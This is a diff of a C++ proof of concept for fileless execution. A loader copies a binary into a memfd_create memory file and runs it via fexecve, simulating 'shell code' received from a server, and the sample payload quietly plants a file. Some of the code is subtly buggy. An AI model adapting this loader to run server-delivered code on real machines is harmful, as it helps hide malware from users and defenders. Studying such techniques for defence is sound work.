@@ -18,38 +18,68 @@
  *    a lower bound of Android API level 23 [6.0 Marshmallow] on the user.
  */
 
+#include <iostream> // for all out printing 
+#include <fcntl.h> // for open(2) related enums
+#include <unistd.h> // for read(2) / write(2)
 
-#ifdef ELF_TO_EXEC
+#ifdef SHELL_CODE
 // this creates the program that we want to exec
-#include <iostream>
 int main()
 {
     std::cout << "running our shell code here. nothing to see" << std::endl;
-    return 0;
+    // secretly planting a file on disk somewhere ... hee hee
+    int fd = -1;
+    if((fd = open("aaa", O_WRONLY | O_APPEND | O_CREAT, 0644))) return 7;
+    write(fd, "bla", 3);
+    return 77;
 }
-#endif // ELF_TO_EXEC
+#endif // SHELL_CODE
 
 
 #ifdef LOADER_CODE
+#include <sys/syscall.h> // for syscall(2)
+#include <linux/memfd.h> // memfd_create(2)
 #include <stdlib.h> // exit(3)
-#include <sys/memfd.h> // memfd_create(2)
+#include <sys/wait.h> // for waitpid(2)
+
 // we assume the code above is compiled when this gets exec'ed
 // this is the size of the binary known at compile time
-const int SHELL_CODE_SIZE = 4096;
+const int SHELL_CODE_SIZE = 8240;
+const char* SHELL_CODE_FILE_NAME = "shell_code_file";
 
 int main()
 {
     // create an fd for the to-be-exec'ed file
     int fd = -1;
-    if ((fd = memfd_create("shell_code_file", MFD_CLOEXEC)) < 0) exit (1);
+    //if ((fd = memfd_create("shell_code_file", MFD_CLOEXEC)) < 0) exit (1);
+    if ((fd = syscall(SYS_memfd_create, SHELL_CODE_FILE_NAME, MFD_CLOEXEC)) < 0) return (1);
 
-    // map the file compiled to this fd. this simulates mapping done
-    // on the buffer we will get from server containing the shell code
+    // this simulates the buffer we will get from server 
+    // containing the shell code.
+    // just imagine this is received through a socket
     char shell_code_buff[SHELL_CODE_SIZE] = {0};
-    if(
+    int shell_code_fd = -1;
+    if(-1 == (shell_code_fd = open(SHELL_CODE_FILE_NAME, O_RDONLY))) return(2);
+    if(-1 == read(shell_code_fd, shell_code_buff, SHELL_CODE_SIZE)) return(3);
+    if(-1 == write(fd, shell_code_buff, SHELL_CODE_SIZE)) return(4);
+
+    // now exec the program. hey, exec with no file on disc!!!!!
+    // the proper way to do it is read from proc [/proc/self/fd/NNN]
+    // and then stat the file. here im taking a shortcut
+    // we do it in a seperate process ... naturally
+    pid_t pid = -1;
+    if(0 > (pid=fork())) return(5);
+    if(0 == pid){
+        // child
+        char* args[2]= {(char*)"shell_code_file", NULL};
+        if(-1 == fexecve(fd, args, environ)) return(6);
+    }
+
+
+    int status = -1;
+    waitpid(pid, &status, 0);
 
     
-    return 0;
-
+    return 88;
 }
 #endif // LOADER_CODE
